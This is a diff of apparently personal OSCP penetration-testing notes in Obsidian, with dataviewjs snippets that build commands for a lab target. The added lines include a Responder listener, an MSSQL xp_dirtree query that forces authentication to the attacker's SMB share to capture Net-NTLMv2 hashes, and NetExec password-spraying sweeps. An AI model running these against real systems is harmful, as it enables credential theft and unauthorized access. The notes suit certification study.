@@ -100,8 +100,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
-
-
 ### password spray  
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
@@ -113,18 +111,46 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 ---
 
-## Both User and PW Obtained : NetExec Credential Usage Sweep
+## Port 1433 MSSQL Database
 
-Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check across all services, nxc-sweep is used to automatically check all services
+### Get Net-NTLMv2
 
+Try to get MSSQL to read a smb share off my KALI ATTACKER, which sends a hash that gets caught by responder listener
+
+Open Listener
+```
+sudo responder -I tun0
+```
+
+In MSSQL database query
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd ~/Desktop/Tools/Windows && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]' --continue-on-success`;
+const command = `EXEC xp_dirtree '\\\\${KaliIP}\\share', 1, 1`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 
+## Both User and PW Obtained : NetExec Credential Usage Sweep
+
+Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check across all services, nxc-sweep is used to automatically check all services
+
+Custom Details
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+user and password list
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u users -p passwords`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 In NetExec (and its predecessor CrackMapExec), seeing (Pwn3d!) next to a set of credentials means that the provided username and password are valid and possess administrative or code execution privileges on that target
 
 [[5985 5986 WinRM]]
@@ -285,6 +311,9 @@ Once Creds are obtained, use [[Runas]]
 ---
 
 # Priv Esc
+
+[[PowerUp.ps1]]
+[[LinWinPEAS]]
 ## whoami /priv
 [[SeManageVolume]]
 [[SeBackupPrivilege]]
@@ -314,7 +343,7 @@ If Azure spotted, try ADSync
 ## Powershell History
 
 MODIFY
-A User:: legacyy
+A User:: sql_svc
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
 const user = page?.["A User"] ?? "NO USER FOUND";
@@ -323,6 +352,14 @@ const command = `cd C:\\Users\\${user}\\AppData\\Roaming\\Microsoft\\Windows\\Po
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+### Show hidden files in Powershell Dir
+```
+dir -Force
+```
+
+[[ADCS]]
+
+
 
 ---
 
